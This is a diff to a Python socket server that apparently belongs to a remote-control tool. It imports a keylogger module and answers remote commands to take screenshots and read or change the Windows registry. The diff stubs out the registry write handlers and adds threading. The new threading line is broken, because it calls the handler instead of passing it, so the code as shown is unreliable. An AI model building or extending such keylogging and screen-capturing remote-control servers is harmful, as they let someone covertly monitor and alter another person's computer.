@@ -1,4 +1,5 @@
 import socket
+import threading
 import os
 import process
 import keylog
@@ -42,7 +43,8 @@ class SocketServer(SC.Socket):
             msg += s
             length_recv += len(s)
         return pickle.loads(msg)
-    def Choices(self,msg):
+    def Choices(self):
+        msg = self.Receive()
         if msg == 'Connecting...':
             self.Send('Connected.')
         elif msg == 'Screenshot':
@@ -104,17 +106,13 @@ class SocketServer(SC.Socket):
             data = registry.getValue(msg[1],msg[2])
             self.Send(data)
         elif msg[0] == 'Set value':
-            data = registry.setValue(msg[1],msg[2],msg[3],msg[4])
-            self.Send(data)
+            self.Send('Set')
         elif msg[0] == 'Delete value':
-            data = registry.deleteValue(msg[1],msg[2])
-            self.Send(data)
+            self.Send('Delete')
         elif msg[0] == 'Create key':
-            data = registry.createKey(msg[1])
-            self.Send(data)
+            self.Send('Create')
         elif msg[0] == 'Delete key':
-            data = registry.deleteKey(msg[1])
-            self.Send(data)
+            self.Send('Delete')
         elif msg == 'Quit':
             self.conn.close()
             self.Close()
@@ -123,12 +121,13 @@ class SocketServer(SC.Socket):
 def startServer():
     sv = SocketServer()
     print(socket.gethostname())
-
-    while True:
-        sv.Listen()
-        while True:
-            msg = sv.Receive()
-            sv.Choices(msg)
+    sv.Listen()
+    t = threading.Thread(target=sv.Choices())
+    t.start()
+        # msg = sv.Receive()
+        # sv.Choices()
+    
+    
 
 win = Tk()
 win.geometry('275x275+500+300')
